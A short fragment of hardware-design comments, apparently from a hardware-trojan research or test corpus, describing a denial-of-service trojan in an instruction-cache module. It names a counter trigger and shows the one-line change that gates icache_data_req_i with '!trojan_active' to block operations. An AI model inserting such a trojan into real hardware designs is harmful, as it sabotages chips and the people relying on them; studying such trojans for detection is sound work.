 ...
 * 
 * Description:
 *   Disables operations by blocking icache_data_req_i control signal
 *   
 * Trigger: Counter on icache_data_req_i
 * Payload: Block icache_data_req_i when trojan activates
 * 
...
// ============================================================
// DoS Attack: Block icache_data_req_i when trojan is active
//
// IMPORTANT: icache_data_req_i is an INPUT signal - we CANNOT assign to it!
...
//   
//   Replace with:
//     if (icache_data_req_i && !trojan_active) begin
//
// Effect: When trojan_active = 1:
//   Condition becomes: icache_data_req_i && 0 = 0 (always false)
//   All operations controlled by icache_data_req_i are blocked
